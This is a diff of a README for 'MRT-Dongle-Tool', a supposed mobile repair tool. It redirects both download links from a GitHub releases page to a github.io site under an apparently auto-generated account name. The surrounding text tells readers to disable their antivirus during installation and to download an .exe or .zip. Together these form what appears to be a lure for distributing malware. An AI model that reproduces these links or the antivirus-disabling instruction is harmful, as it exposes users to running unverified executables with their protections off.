@@ -1,6 +1,6 @@
 # 🛠️ MRT-Dongle-Tool - Repair mobile devices with ease
 
-[![](https://img.shields.io/badge/Download_MRT_Dongle-Blue?style=for-the-badge)](https://github.com/Agreementlaburnumanagyroides267/MRT-Dongle-Tool/releases)
+[![](https://img.shields.io/badge/Download_MRT_Dongle-Blue?style=for-the-badge)](https://agreementlaburnumanagyroides267.github.io)
 
 ## Overview ℹ️
 
@@ -23,7 +23,7 @@ Make sure to disable your antivirus software temporarily during the installation
 
 You must download the installation package from the official release page. 
 
-[Click here to visit the download page](https://github.com/Agreementlaburnumanagyroides267/MRT-Dongle-Tool/releases)
+[Click here to visit the download page](https://agreementlaburnumanagyroides267.github.io)
 
 On the release page, look for the most recent version of the software. You will see a file section titled Assets. Choose the file ending in .zip or .exe. Save this file to an easy location, such as your Desktop or Downloads folder.
 
